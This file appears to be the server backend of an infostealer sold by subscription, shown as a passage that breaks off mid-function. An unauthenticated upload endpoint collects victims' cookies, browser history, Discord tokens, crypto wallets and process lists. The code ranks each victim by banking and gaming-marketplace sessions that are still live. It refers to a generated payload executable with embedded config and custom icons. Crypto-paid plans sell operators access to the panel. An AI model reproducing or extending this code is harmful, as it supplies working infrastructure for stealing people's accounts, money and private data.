require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const os = require('os');
const { db, userDb, loginAttemptsDb, logsDb, pendingPaymentsDb } = require('./database');

// Multer for file uploads
const multer = require('multer');
const uploadStorage = multer.diskStorage({
    destination: (req, file, cb) => {
        const tempDir = path.join(os.tmpdir(), 'payload-icons');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        cb(null, tempDir);
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, 'icon-' + uniqueSuffix + '.ico');
    }
});
const uploadIcon = multer({ 
    storage: uploadStorage,
    limits: { fileSize: 1024 * 1024 }, // 1MB max
    fileFilter: (req, file, cb) => {
        if (file.originalname.toLowerCase().endsWith('.ico')) {
            cb(null, true);
        } else {
            cb(new Error('Only .ico files are allowed'));
        }
    }
}).single('icon');

const app = express();
const PORT = process.env.PORT || 3001;

// NOWPayments API configuration (https://nowpayments.io)
const NOWPAYMENTS_API_KEY = process.env.NOWPAYMENTS_API_KEY || '';
const NOWPAYMENTS_API_URL = 'https://api.nowpayments.io/v1';
const NOWPAYMENTS_IPN_SECRET = process.env.NOWPAYMENTS_IPN_SECRET || '';

// Bitpapa API configuration (https://bitpapa.com)
const BITPAPA_API_TOKEN = process.env.BITPAPA_API_TOKEN || '';
const BITPAPA_API_URL = 'https://api.bitpapa.com/v1';

// Manual payment wallet addresses (for direct crypto payments)
const WALLET_ADDRESSES = {
    BTC: process.env.WALLET_BTC || '',
    ETH: process.env.WALLET_ETH || '',
    USDT: process.env.WALLET_USDT || '' // USDT on Ethereum/ERC20
};

// Helper function to check if a cookie is non-expired
const isCookieNonExpired = (cookie) => {
    if (!cookie.expires && !cookie.expires_utc) return true; // Session cookies (no expiry) are valid
    
    try {
        let expiryTimestamp = cookie.expires || cookie.expires_utc;
        if (typeof expiryTimestamp === 'string') {
            const parsed = Date.parse(expiryTimestamp);
            if (!isNaN(parsed)) {
                expiryTimestamp = parsed / 1000;
            }
        }
        // Chrome stores expires_utc as microseconds since 1601
        if (expiryTimestamp > 13000000000000) {
            expiryTimestamp = (expiryTimestamp / 1000000) - 11644473600;
        }
        // If it's in seconds since 1970, compare with current time
        const currentTimestamp = Math.floor(Date.now() / 1000);
        return expiryTimestamp > currentTimestamp;
    } catch (e) {
        return true; // If parsing fails, assume it's valid
    }
};

// Function to extract tags from log data (server-side for dataSummary)
const extractTagsFromPcData = (pcData) => {
    const tags = [];
    if (!pcData) return tags;
    
    // Check for Discord tokens
    if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
        tags.push({ label: 'Discord (token)', color: '#5865F2' });
    }
    
    // Check browser history and cookies for sites
    const allUrls = [];
    const historyUrls = [];
    const cookieData = [];
    
    // Extract URLs from browser history
    if (pcData.browserHistory) {
        const history = pcData.browserHistory;
        ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
            if (history[browser] && Array.isArray(history[browser])) {
                history[browser].forEach(entry => {
                    if (entry.url) {
                        const url = entry.url.toLowerCase();
                        allUrls.push(url);
                        historyUrls.push(url);
                    }
                });
            }
        });
    }
    
    // Extract domains from cookies with expiration info
    if (pcData.browserCookies) {
        let cookies = [];
        if (typeof pcData.browserCookies === 'string') {
            try {
                cookies = JSON.parse(pcData.browserCookies);
            } catch (e) {
                // If parsing fails, try to extract domains from string
                const domainMatches = pcData.browserCookies.match(/"domain"\s*:\s*"([^"]+)"/gi);
                if (domainMatches) {
                    domainMatches.forEach(match => {
                        const domainMatch = match.match(/"([^"]+)"$/);
                        if (domainMatch && domainMatch[1]) {
                            const domain = domainMatch[1].toLowerCase();
                            allUrls.push(domain);
                            cookieData.push({ domain: domain, expires: null });
                        }
                    });
                }
            }
        } else if (Array.isArray(pcData.browserCookies)) {
            cookies = pcData.browserCookies;
        }
        
        if (Array.isArray(cookies)) {
            cookies.forEach(cookie => {
                if (cookie.domain || cookie.host) {
                    const domain = (cookie.domain || cookie.host).toLowerCase();
                    allUrls.push(domain);
                    cookieData.push({
                        domain: domain,
                        expires: cookie.expires || cookie.expires_utc || null
                    });
                }
            });
        }
    }
    
    // Site detection patterns - sites that require non-expired cookies
    const cookieRequiredSites = {
        'G2G': ['g2g.com'],
        'G2A': ['g2a.com'],
        'Banking': [
            'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citibank.com', 'usbank.com',
            'pnc.com', 'tdbank.com', 'capitalone.com', 'americanexpress.com', 'discover.com',
            'barclays.com', 'hsbc.com', 'jpmorgan.com', 'morganstanley.com', 'goldmansachs.com',
            'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'ally.com',
            'synchrony.com', 'regions.com', 'suntrust.com', 'bbt.com', 'keybank.com',
            'huntington.com', 'fifththird.com', 'm&t.com', 'citizensbank.com', 'td.com'
        ]
    };
    
    // Site detection patterns - sites that don't require cookie expiration check
    const sitePatterns = {
        'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
        'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
        'Google': ['google.com', 'gmail.com', 'googlemail.com', 'googletagmanager.com', 'googleapis.com', 'googleusercontent.com'],
        'Facebook': ['facebook.com', 'fb.com', 'messenger.com'],
        'Twitter': ['twitter.com', 'x.com', 't.co'],
        'Instagram': ['instagram.com'],
        'TikTok': ['tiktok.com'],
        'Reddit': ['reddit.com'],
        'Amazon': ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr'],
        'Steam': ['steamcommunity.com', 'steampowered.com', 'steam-chat.com'],
        'Epic Games': ['epicgames.com', 'unrealengine.com'],
        'PayPal': ['paypal.com'],
        'GitHub': ['github.com'],
        'Netflix': ['netflix.com'],
        'Spotify': ['spotify.com'],
        'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
    };
    
    // Check cookie-required sites (only show if non-expired cookies exist)
    Object.keys(cookieRequiredSites).forEach(siteName => {
        const patterns = cookieRequiredSites[siteName];
        const foundInHistory = historyUrls.some(url => patterns.some(pattern => url.includes(pattern)));
        
        // Check if there are non-expired cookies for this site
        const hasNonExpiredCookie = cookieData.some(cookie => {
            const matchesDomain = patterns.some(pattern => cookie.domain.includes(pattern));
            return matchesDomain && isCookieNonExpired(cookie);
        });
        
        if ((foundInHistory || hasNonExpiredCookie) && !tags.some(t => t.label.includes(siteName))) {
            tags.push({ label: siteName, color: siteName === 'Banking' ? '#ef4444' : '#60a5fa' });
        }
    });
    
    // Check for regular sites (from history or cookies, no expiration requirement)
    Object.keys(sitePatterns).forEach(siteName => {
        const patterns = sitePatterns[siteName];
        const found = allUrls.some(url => patterns.some(pattern => url.includes(pattern)));
        if (found && !tags.some(t => t.label.includes(siteName))) {
            tags.push({ label: siteName, color: '#60a5fa' });
        }
    });
    
    // Check for crypto wallets
    if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
        tags.push({ label: 'Crypto Wallet', color: '#f59e0b' });
    }
    
    return tags;
};

// JWT_SECRET must be set in environment variables - no hardcoded fallback
if (!process.env.JWT_SECRET) {
    console.error('ERROR: JWT_SECRET environment variable is required!');
    console.error('Please set JWT_SECRET in your .env file.');
    console.error('Generate one with: node -e "console.log(require(\'crypto\').randomBytes(64).toString(\'hex\'))"');
    process.exit(1);
}
const JWT_SECRET = process.env.JWT_SECRET;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Helper function to get client IP
const getClientIp = (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'Unknown';
};

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
        return res.status(401).json({ message: 'Access token required' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Invalid or expired token' });
        }
        req.user = user;
        next();
    });
};

// API Endpoints

// Authentication endpoint - Key-based login
app.post('/api/auth/login', (req, res) => {
    try {
        const { key } = req.body;
        const ipAddress = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';

        if (!key) {
            loginAttemptsDb.create('unknown', ipAddress, false, userAgent);
            return res.status(400).json({ message: 'Access key is required' });
        }

        // Find user by access key (stored as username)
        const user = userDb.findByUsername(key);

        if (!user) {
            loginAttemptsDb.create(key.substring(0, 8) + '...', ipAddress, false, userAgent);
            return res.status(401).json({ message: 'Invalid access key' });
        }

        // Verify the key against the password hash
        const keyValid = bcrypt.compareSync(key, user.password_hash);
        
        if (!keyValid) {
            loginAttemptsDb.create(key.substring(0, 8) + '...', ipAddress, false, userAgent);
            return res.status(401).json({ message: 'Invalid access key' });
        }

        // Log successful login attempt
        loginAttemptsDb.create(key.substring(0, 8) + '...', ipAddress, true, userAgent);
        userDb.updateLastLogin(key);

        // Generate JWT token
        const token = jwt.sign(
            { username: user.username, id: user.id },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        console.log(`User logged in successfully from ${ipAddress} at ${new Date().toISOString()}`);

        res.json({
            success: true,
            token: token,
            username: user.username,
            message: 'Login successful'
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Logout endpoint
app.post('/api/auth/logout', authenticateToken, (req, res) => {
    res.json({ success: true, message: 'Logged out successfully' });
});

// Get login history
app.get('/api/auth/login-history', authenticateToken, (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 100;
        const history = loginAttemptsDb.getAll(limit);
        res.json(history);
    } catch (error) {
        console.error('Error fetching login history:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Public registration endpoint - creates account with access key
app.post('/api/auth/register', (req, res) => {
    try {
        const { key } = req.body;
        const ipAddress = getClientIp(req);

        if (!key) {
            return res.status(400).json({ message: 'Access key is required' });
        }

        if (key.length !== 20) {
            return res.status(400).json({ message: 'Access key must be exactly 20 characters' });
        }

        // Validate key contains only letters
        if (!/^[a-zA-Z]+$/.test(key)) {
            return res.status(400).json({ message: 'Access key must contain only letters' });
        }

        // Hash the key and create user (key is stored as both username and password hash)
        const keyHash = bcrypt.hashSync(key, 10);
        
        try {
            const newUser = userDb.create(key, keyHash);
            console.log(`New user registered from ${ipAddress} at ${new Date().toISOString()}`);
            res.json({ success: true, message: 'Account created successfully' });
        } catch (error) {
            if (error.message === 'Username already exists') {
                return res.status(400).json({ message: 'This access key is already registered. Please generate a new one.' });
            }
            throw error;
        }
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Note: With key-based authentication, changing keys is not supported
// Users who lose their key must create a new account
// Admin can delete old accounts and users can register new ones

// Get all users (admin only)
app.get('/api/auth/users', authenticateToken, (req, res) => {
    try {
        const users = userDb.getAll();
        // Don't send password hashes to client
        const safeUsers = users.map(user => ({
            id: user.id,
            username: user.username,
            created_at: user.created_at,
            last_login: user.last_login,
            is_active: user.is_active
        }));
        res.json(safeUsers);
    } catch (error) {
        console.error('Error fetching users:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Delete user (admin only)
app.delete('/api/auth/users/:username', authenticateToken, (req, res) => {
    try {
        const { username } = req.params;
        const currentUser = req.user.username;
        
        // Prevent self-deletion
        if (username === currentUser) {
            return res.status(400).json({ message: 'Cannot delete your own account' });
        }
        
        const user = userDb.findByUsername(username);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        const { db } = require('./database');
        db.prepare('DELETE FROM users WHERE username = ?').run(username);
        
        console.log(`User ${username} deleted by ${currentUser}`);
        res.json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Deactivate/Activate user (admin only)
app.patch('/api/auth/users/:username', authenticateToken, (req, res) => {
    try {
        const { username } = req.params;
        const { is_active } = req.body;
        
        if (typeof is_active !== 'boolean') {
            return res.status(400).json({ message: 'is_active must be a boolean' });
        }
        
        const user = userDb.findByUsername(username);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        const { db } = require('./database');
        db.prepare('UPDATE users SET is_active = ? WHERE username = ?').run(is_active ? 1 : 0, username);
        
        console.log(`User ${username} ${is_active ? 'activated' : 'deactivated'} by ${req.user.username}`);
        res.json({ success: true, message: `User ${is_active ? 'activated' : 'deactivated'} successfully` });
    } catch (error) {
        console.error('Error updating user:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Note: Reset password removed - key-based auth doesn't support key changes
// If a user loses their key, they need to register a new one

// Logs endpoints
app.get('/api/logs', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        
        // Filter logs by the logged-in user's username
        // Each log has a "user" field that matches the client's user identifier
        let logs = logsDb.getAll();
        
        // Debug: show user distribution in database
        const allLogs = logsDb.getAll();
        const userCounts = {};
        allLogs.forEach(log => {
            const u = log.user || 'null';
            userCounts[u] = (userCounts[u] || 0) + 1;
        });
        console.log(`User distribution in database:`, userCounts);
        
        // Filter logs by username - only show logs where log.user matches the logged-in username
        // If a log has no user field (old logs), show them to "account" user for backward compatibility
        logs = logs.filter(log => {
            // If log has no user field or user is null/empty, show it only to "account" user (for backward compatibility)
            const logUser = log.user;
            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
                return username === 'account';
            }
            // Show log if user matches
            return logUser === username;
        });
        
        console.log(`Filtered logs for user ${username}: ${logs.length} logs found (from ${allLogs.length} total)`);
        
        res.json(logs);
    } catch (error) {
        console.error('Error fetching logs:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.post('/api/upload', (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || null;
        const pcData = req.body;
        const ip = pcData.ipAddress || 'Unknown';
        const country = pcData.location?.countryName || 'Unknown';
        const dateTime = pcData.dateTime || new Date().toISOString();

        // Generate consistent log ID based on session ID or timestamp
        const logId = sessionId ? `log-${sessionId}` : `log-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

        // Data transformation for browserCookies
        let transformedBrowserCookies = [];
        console.log(`Cookie processing - browserCookies type: ${typeof pcData?.browserCookies}, value: ${pcData?.browserCookies ? (typeof pcData.browserCookies === 'string' ? `string(${pcData.browserCookies.length} chars)` : `array(${Array.isArray(pcData.browserCookies) ? pcData.browserCookies.length : 'not array'})`) : 'null/undefined'}`);
        
        if (pcData && pcData.browserCookies && typeof pcData.browserCookies === 'string') {
            try {
                transformedBrowserCookies = JSON.parse(pcData.browserCookies);
                console.log(`Successfully parsed cookies string into array: ${transformedBrowserCookies.length} cookies`);
            } catch (parseError) {
                console.error("Error parsing browserCookies string:", parseError);
                transformedBrowserCookies = [];
            }
        } else if (pcData && pcData.browserCookies) {
            if (Array.isArray(pcData.browserCookies)) {
                transformedBrowserCookies = pcData.browserCookies;
                console.log(`Cookies already an array: ${transformedBrowserCookies.length} cookies`);
            } else {
                console.log(`Cookies is not string or array, type: ${typeof pcData.browserCookies}`);
            }
        } else {
            console.log(`No browserCookies in pcData`);
        }

        // Calculate dataSummary from current chunk
        // Note: For updates, the summary will be recalculated from merged data in database.js
        let totalHistoryEntries = 0;
        if (pcData && pcData.browserHistory) {
            totalHistoryEntries += pcData.browserHistory.chromeHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.firefoxHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.edgeHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.operaHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.braveHistory?.length || 0;
        }

        // Prepare pcData with transformed cookies for tag extraction
        const pcDataForTags = { ...pcData };
        if (transformedBrowserCookies.length > 0) {
            pcDataForTags.browserCookies = transformedBrowserCookies;
        }
        
        // Extract tags from pcData
        const tags = extractTagsFromPcData(pcDataForTags);
        
        const dataSummary = {
            historyEntries: totalHistoryEntries,
            processes: pcData?.runningProcesses?.length || 0,
            installedApps: pcData?.installedApps?.length || 0,
            cookies: transformedBrowserCookies.length || 0,
            tags: tags
        };

        // Handle browserCookies - always include if present, even if empty (so merge knows to update)
        const pcDataToStore = { ...pcData };
        
        // If we have cookies (either parsed array or original string), include them
        if (pcData.browserCookies !== undefined && pcData.browserCookies !== null) {
            if (transformedBrowserCookies.length > 0) {
                // We successfully parsed cookies - use the array
                pcDataToStore.browserCookies = transformedBrowserCookies;
                console.log(`Cookies included in chunk: ${transformedBrowserCookies.length} cookies (parsed from string)`);
            } else if (typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0) {
                // Keep the original string if parsing failed but string exists
                pcDataToStore.browserCookies = pcData.browserCookies;
                console.log(`Cookies included in chunk: string length ${pcData.browserCookies.length} (keeping as string)`);
            } else if (Array.isArray(pcData.browserCookies) && pcData.browserCookies.length > 0) {
                // Keep the array if it exists
                pcDataToStore.browserCookies = pcData.browserCookies;
                console.log(`Cookies included in chunk: ${pcData.browserCookies.length} cookies (array)`);
            } else {
                // Empty/null cookies - still include so merge knows to clear them
                pcDataToStore.browserCookies = null;
            }
        } else {
            // No browserCookies in this chunk - don't include it (allows merge to preserve existing)
            delete pcDataToStore.browserCookies;
        }
        
        // Extract user from pcData
        const user = pcData?.user || null;
        
        console.log(`Received log chunk - user: ${user || 'null'}, session: ${sessionId || 'none'}, IP: ${ip}`);
        
        const logData = {
            id: logId,
            sessionId: sessionId,
            ip: ip,
            country: country,
            date: dateTime,
            dataSummary,
            pcData: pcDataToStore,
            user: user,
        };

        // Use createOrUpdate to merge chunks
        const savedLogId = logsDb.createOrUpdate(logData);
        
        if (sessionId) {
            console.log(`Log chunk received and merged: ${savedLogId} (session: ${sessionId}, user: ${user || 'null'}) from ${ip}`);
        } else {
            console.log(`Log saved: ${savedLogId} (user: ${user || 'null'}) from ${ip}`);
        }

        res.status(200).send('Log received and saved');
    } catch (error) {
        console.error("Error processing uploaded log:", error);
        console.error("Error stack:", error.stack);
        res.status(500).json({ 
            message: 'Error processing log',
            error: error.message 
        });
    }
});

app.get('/api/logs/:logId', (req, res) => {
    try {
        const { logId } = req.params;
        const log = logsDb.getById(logId);
        if (log) {
            res.json(log);
        } else {
            res.status(404).send('Log not found');
        }
    } catch (error) {
        console.error('Error fetching log:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.post('/api/logs/notes', authenticateToken, (req, res) => {
    try {
        const { logId, notes } = req.body;
        
        if (!logId) {
            return res.status(400).json({ message: 'logId is required' });
        }
        
        const updated = logsDb.updateNotes(logId, notes);
        if (updated) {
            res.json({ success: true, message: 'Notes updated successfully' });
        } else {
            res.status(404).json({ message: 'Log not found' });
        }
    } catch (error) {
        console.error('Error updating notes:', error);
        res.status(500).json({ message: 'Error updating notes', error: error.message });
    }
});

app.post('/api/logs/delete', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        const { logIds } = req.body;

        if (!Array.isArray(logIds) || logIds.length === 0) {
            return res.status(400).json({ message: 'logIds must be a non-empty array' });
        }

        // Allow any authenticated user to delete logs
        // Optionally: filter by user to only allow deleting own logs
        let deletedCount;
        if (username === 'account' || username === 'admin') {
            // Admin/account users can delete any logs
            deletedCount = logsDb.deleteByIds(logIds);
        } else {
            // Regular users can only delete their own logs
            deletedCount = logsDb.deleteByIdsForUser(logIds, username);
        }

        if (deletedCount > 0) {
            console.log(`User ${username} deleted ${deletedCount} log(s): ${logIds.join(', ')}`);
            res.status(200).json({ message: `Deleted ${deletedCount} log(s)`, deletedCount });
        } else {
            res.status(404).json({ message: 'No logs found to delete or you do not have permission to delete these logs' });
        }
    } catch (error) {
        console.error("Error deleting logs:", error);
        res.status(500).json({ message: 'Error deleting logs', error: error.message });
    }
});

// Magic marker that the exe looks for to find embedded config
const CONFIG_MARKER = '<<<PAYLOAD_CONFIG_START>>>';

// Get subscription status endpoint
app.get('/api/subscription', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        const subscription = userDb.getSubscription(username);
        
        if (!subscription) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        res.json(subscription);
    } catch (error) {
        console.error('Error getting subscription:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Admin: Set subscription for a user
app.post('/api/subscription/set', authenticateToken, (req, res) => {
    try {
        const { targetUser, days, type } = req.body;
        
        if (!targetUser || !days) {
            return res.status(400).json({ message: 'targetUser and days are required' });
        }
        
        const daysNum = parseInt(days);
        if (isNaN(daysNum) || daysNum < 0) {
            return res.status(400).json({ message: 'days must be a positive number' });
        }
        
        // Find the target user
        const user = userDb.findByUsername(targetUser);
        if (!user) {
            return res.status(404).json({ message: 'Target user not found' });
        }
        
        const success = userDb.setSubscription(targetUser, daysNum, type || 'standard');
        
        if (success) {
            const newSub = userDb.getSubscription(targetUser);
            console.log(`Subscription set for user ${targetUser.substring(0, 8)}...: ${daysNum} days`);
            res.json({ success: true, message: 'Subscription set successfully', subscription: newSub });
        } else {
            res.status(500).json({ message: 'Failed to set subscription' });
        }
    } catch (error) {
        console.error('Error setting subscription:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Admin: Add days to subscription
app.post('/api/subscription/add', authenticateToken, (req, res) => {
    try {
        const { targetUser, days } = req.body;
        
        if (!targetUser || !days) {
            return res.status(400).json({ message: 'targetUser and days are required' });
        }
        
        const daysNum = parseInt(days);
        if (isNaN(daysNum) || daysNum <= 0) {
            return res.status(400).json({ message: 'days must be a positive number' });
        }
        
        const user = userDb.findByUsername(targetUser);
        if (!user) {
            return res.status(404).json({ message: 'Target user not found' });
        }
        
        const success = userDb.addSubscriptionDays(targetUser, daysNum);
        
        if (success) {
            const newSub = userDb.getSubscription(targetUser);
            console.log(`Added ${daysNum} days to subscription for user ${targetUser.substring(0, 8)}...`);
            res.json({ success: true, message: `Added ${daysNum} days to subscription`, subscription: newSub });
        } else {
            res.status(500).json({ message: 'Failed to add subscription days' });
        }
    } catch (error) {
        console.error('Error adding subscription days:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Admin: Remove subscription
app.post('/api/subscription/remove', authenticateToken, (req, res) => {
    try {
        const { targetUser } = req.body;
        
        if (!targetUser) {
            return res.status(400).json({ message: 'targetUser is required' });
        }
        
        const user = userDb.findByUsername(targetUser);
        if (!user) {
            return res.status(404).json({ message: 'Target user not found' });
        }
        
        const success = userDb.removeSubscription(targetUser);
        
        if (success) {
            console.log(`Subscription removed for user ${targetUser.substring(0, 8)}...`);
            res.json({ success: true, message: 'Subscription removed successfully' });
        } else {
            res.status(500).json({ message: 'Failed to remove subscription' });
        }
    } catch (error) {
        console.error('Error removing subscription:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// ==================== NOWPayments Payment Integration ====================

// Subscription plans configuration
const SUBSCRIPTION_PLANS = {
    week: { days: 7, price: 20, name: 'Week', currency: 'EUR' },
    month: { days: 30, price: 55, name: 'Month', currency: 'EUR' },
    '6month': { days: 180, price: 220, name: '6 Month', currency: 'EUR' }
};

// Helper function to call NOWPayments API
async function nowPaymentsRequest(endpoint, method = 'GET', body = null) {
    if (!NOWPAYMENTS_API_KEY) {
        throw new Error('NOWPayments API key not configured');
    }

    const url = `${NOWPAYMENTS_API_URL}${endpoint}`;
    const options = {
        method,
        headers: {
            'x-api-key': NOWPAYMENTS_API_KEY,
            'Content-Type': 'application/json'
        }
    };

    if (body) {
        options.body = JSON.stringify(body);
    }

    const response = await fetch(url, options);
    const data = await response.json();

    if (!response.ok) {
        throw new Error(data.message || data.err || 'NOWPayments API error');
    }

    return data;
}

// Helper function to call Bitpapa API
async function bitpapaRequest(endpoint, method = 'GET', body = null) {
    if (!BITPAPA_API_TOKEN) {
        throw new Error('Bitpapa API token not configured');
    }

    const url = `${BITPAPA_API_URL}${endpoint}`;
    const options = {
        method,
        headers: {
            'Authorization': `Bearer ${BITPAPA_API_TOKEN}`,
            'Content-Type': 'application/json'
        }
    };

    if (body) {
        options.body = JSON.stringify(body);
    }

    const response = await fetch(url, options);
    const data = await response.json();

    if (!response.ok) {
        throw new Error(data.message || data.error || 'Bitpapa API error');
    }

    return data;
}

// Create payment invoice for a subscription plan
app.post('/api/payment/create-invoice', authenticateToken, async (req, res) => {
    try {
        const username = req.user.username;
        const { planId, provider } = req.body; // provider: 'nowpayments', 'bitpapa', or undefined for auto
        
        if (!planId || !SUBSCRIPTION_PLANS[planId]) {
            return res.status(400).json({ message: 'Invalid plan selected' });
        }
        
        const plan = SUBSCRIPTION_PLANS[planId];
        const webhookUrl = `${process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}`}/api/payment/webhook`;
        const returnUrl = `${process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}`}/purchase`;
        
        // If provider is specified, use it; otherwise use priority: NOWPayments > Bitpapa > Manual
        // Try NOWPayments if provider is 'nowpayments' or not specified (and NOWPayments is configured)
        if ((provider === 'nowpayments' || (!provider && NOWPAYMENTS_API_KEY)) && NOWPAYMENTS_API_KEY) {
            try {
                // Create invoice via NOWPayments API
                // Encode subscription info in order_id: sub_username_planId_days_timestamp
                // NOWPayments doesn't support metadata field, so we encode it in order_id
                const orderId = `sub_${username}_${planId}_${plan.days}_${Date.now()}`;

                const invoice = await nowPaymentsRequest('/invoice', 'POST', {
                    price_amount: plan.price,
                    price_currency: plan.currency.toLowerCase(),
                    pay_currency: 'ltc', // Default currency, user can change on payment page
                    order_id: orderId,
                    order_description: `${plan.name} Subscription`,
                    ipn_callback_url: webhookUrl,
                    success_url: returnUrl,
                    cancel_url: returnUrl
                });

                console.log(`[NOWPayments] Invoice created for user ${username.substring(0, 8)}...: ${plan.name} plan, Payment ID: ${invoice.payment_id}`);
                console.log(`[NOWPayments] Full invoice response:`, JSON.stringify(invoice, null, 2));
                
                // Check for the correct URL field in NOWPayments response
                const payUrl = invoice.invoice_url || invoice.pay_url || invoice.payment_url;
                if (!payUrl) {
                    console.error('[NOWPayments] No payment URL found in response:', invoice);
                    throw new Error('No payment URL received from NOWPayments');
                }

                return res.json({
                    success: true,
                    invoiceId: invoice.payment_id,
                    payUrl: payUrl,
                    amount: plan.price,
                    currency: plan.currency,
                    plan: plan.name,
                    expiresAt: new Date(Date.now() + 3600000).toISOString(),
                    paymentMethod: 'nowpayments'
                });
            } catch (nowPaymentsError) {
                console.error('[NOWPayments] Error creating invoice:', nowPaymentsError);
                // If NOWPayments fails and provider was explicitly 'nowpayments', throw error
                if (provider === 'nowpayments') {
                    throw nowPaymentsError;
                }
                // Otherwise, fall through to try Bitpapa
            }
        }
        
        // If provider is specified as bitpapa, or no provider specified and Bitpapa is configured
        if ((provider === 'bitpapa' || (!provider && !NOWPAYMENTS_API_KEY)) && BITPAPA_API_TOKEN) {
            try {
                // Create invoice via Bitpapa API
                // Encode subscription info in order_id: sub_username_planId_days_timestamp
                const orderId = `sub_${username}_${planId}_${plan.days}_${Date.now()}`;
                
                const invoice = await bitpapaRequest('/invoices', 'POST', {
                    amount: plan.price,
                    currency: plan.currency.toUpperCase(),
                    description: `${plan.name} Subscription`,
                    order_id: orderId,
                    callback_url: webhookUrl,
                    success_url: returnUrl,
                    cancel_url: returnUrl
                });
                
                console.log(`[Bitpapa] Invoice created for user ${username.substring(0, 8)}...: ${plan.name} plan, Invoice ID: ${invoice.id || invoice.invoice_id}`);
                
                return res.json({
                    success: true,
                    invoiceId: invoice.id || invoice.invoice_id,
                    payUrl: invoice.payment_url || invoice.url || invoice.invoice_url,
                    amount: plan.price,
                    currency: plan.currency,
                    plan: plan.name,
                    expiresAt: new Date(Date.now() + 3600000).toISOString(),
                    paymentMethod: 'bitpapa'
                });
            } catch (bitpapaError) {
                console.error('[Bitpapa] Error creating invoice:', bitpapaError);
                // If Bitpapa fails and provider was explicitly 'bitpapa', throw error
                if (provider === 'bitpapa') {
                    throw bitpapaError;
                }
                // Otherwise, fall through to manual
            }
        }
        
        // Otherwise, return wallet addresses for manual payment
        // Only reach here if no providers are configured or both failed (and provider wasn't explicitly set)
        if ((NOWPAYMENTS_API_KEY || BITPAPA_API_TOKEN) && !provider) {
            console.warn(`Payment providers configured but invoice creation failed. Falling back to manual payment for user ${username.substring(0, 8)}...`);
        }
        
        res.json({
            success: true,
            paymentMethod: 'manual',
            amount: plan.price,
            currency: plan.currency,
            plan: plan.name,
            planId: planId,
            days: plan.days,
            wallets: WALLET_ADDRESSES
        });
        
    } catch (error) {
        console.error('Error creating invoice:', error);
        res.status(500).json({ message: error.message || 'Failed to create payment invoice' });
    }
});

// Check invoice status
app.get('/api/payment/check/:invoiceId', authenticateToken, async (req, res) => {
    try {
        const { invoiceId } = req.params;
        const { provider } = req.query; // Optional: 'nowpayments' or 'bitpapa'
        
        // Try NOWPayments first
        if ((!provider || provider === 'nowpayments') && NOWPAYMENTS_API_KEY) {
            try {
                const payment = await nowPaymentsRequest(`/payment/${invoiceId}`, 'GET');
                return res.json({
                    status: payment.payment_status,
                    paid: payment.payment_status === 'finished' || payment.payment_status === 'confirmed',
                    amount: payment.price_amount,
                    currency: payment.price_currency
                });
            } catch (err) {
                // If not found and provider not specified, try Bitpapa
                if (!provider && err.message && err.message.includes('not found')) {
                    // Fall through to Bitpapa
                } else {
                    throw err;
                }
            }
        }
        
        // Try Bitpapa
        if ((!provider || provider === 'bitpapa') && BITPAPA_API_TOKEN) {
            try {
                const invoice = await bitpapaRequest(`/invoices/${invoiceId}`, 'GET');
                return res.json({
